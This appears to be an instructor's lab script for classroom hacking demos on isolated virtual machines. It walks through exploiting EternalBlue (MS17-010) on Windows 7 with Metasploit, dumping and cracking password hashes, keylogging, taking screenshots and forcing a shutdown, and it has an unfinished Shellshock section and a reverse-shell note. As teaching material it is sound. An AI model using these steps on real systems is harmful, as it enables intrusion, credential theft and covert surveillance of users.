# 👇👇👇👇👇👇👇👇👇👇👇👇👇

# DISABLE INTERNET ACCESS ON PFSENSE FIRST!!!!!!!!!!!!!!!!!

# 👆👆👆👆👆👆👆👆👆👆👆👆👆

## Eternal Blue Hack

1. Kali VM Setup

   1. Import Kali VM OVA into Virtual Box
   2. Change network to bridged/killer ethernet
   3. Start up VM

2. Windows 7 VM setup

   1. Start up Windows 7 VMs
   2. Make a file in the `c:\share` folder
   3. Disable Windows Firewall
      1. Explain how choosing `public/home/private` impacts the firewall rules
      2. Always pick `public` when not at home

3. Scanning

   1. Switch to root user 
      `sudo su`

   2. Discover IP addresses 
      `netdiscover -r 10.226.x.0/24`

   3. Check ipconfig on Win7 to find target IP

   4. Nmap scan Win7 from Kali 
      `nmap -A 10.226.x.x`

   5. Find SMB ports open, browse shares

      ```bash
      smbclient -L 10.226.x.x
      smbclient //10.226.50.50/Share
      ls
      exit
      ```

   6. Do smb script scan of Win7 (show script directory)
      `nmap --script smb-vuln* -p 445 10.226.x.x `

4. Exploitation

   1. Run metasploit
      `msfconsole`
   2. Find exploit for our vuln
      `search ms17_010`
   3. Use exploit
      `use 2` OR `use exploit/windows/smb/ms17_010_psexec`
   4. Set remote host to Win7 IP
      `set rhost 10.226.x.x`
   5. Run exploit
      `exploit`

5. Meterpreter basics

   1. Show help menu
      `help`

   2. Check system info

      ```bash
      getuid
      sysinfo
      ```

   3. Dump password hashes
      `hashdump`

   4. Copy second half of hash for `umbs` (after the `:`) and paste in https://crackstation.net/ to get Password of `password`

   5. Drop to shell
      `shell`

   6. Check IP address
      `ipconfig`

   7. Exit shell
      `exit`

6. Surveillance

   1. Migrate process to winlogon to get login info

      ```bash
      # shows all processes
      ps
      # better to use pgrep to search
      pgrep winlogon
      migrate [WINLOGON_PID]
      keyscan_start
      # lock screen and log back on Win7
      keyscan_dump
      ```

   2. Migrate to user process & re-check what user you are

      ````bash
      pgrep explorer
      migrate [EXPLORER_PID]
      # See current user
      getuid
      
      # Start keylogger
      keyscan_start
      # do something on Windows 7
      keyscan_dump
      ````

   3. Try executing calculator as the user

      ```bash
      execute -f calc.exe
      ```

   4. Get snapshot of desktop
      `screenshot`

7. Just messing with people
   NOTE: you must be in explorer to do this

   1. Open notepad and type text in it

      ```bash
      keyevent 91 press
      keyboard_send "notepad"
      keyevent 13 press
      keyboard_send "I am a ghost"
      ```

   2. Lock the computer (NOT WORKING)

      ```bash
      key event 17 down
      key event 18 down
      key event 46 down
      key event 17 up
      key event 18 up
      key event 46 up
      ```

   3. Log off user and watch it kill the session

      ```bash
      keyevent 91 press
      keyboard_send "cmd"
      keyevent 13 press
      keyboard_send 'shutdown /s /t 10 /c "You are hacked"'
      keyevent 13 press
      ```

## Shellshock Hack

1. Fix Firewall Rule

   ```bash
   sudo iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
   sudo iptables-save > /etc/sysconfig/iptables
   ```

2. Fix CGI-Script

   ```bash
   Basically have to redo the whole file because it has some non-standard characters
   ```

3. Restart CentOS server

4. Scan CentOS
   `nmap -A 10.226.x.20`

5. Run Web Vuln Scan
   `nikto -h 10.226.x.20`

6. 

## Reverse Shell

Have them generate a reverse shell executable, upload it to Win7 via the Share, then execute it on Win7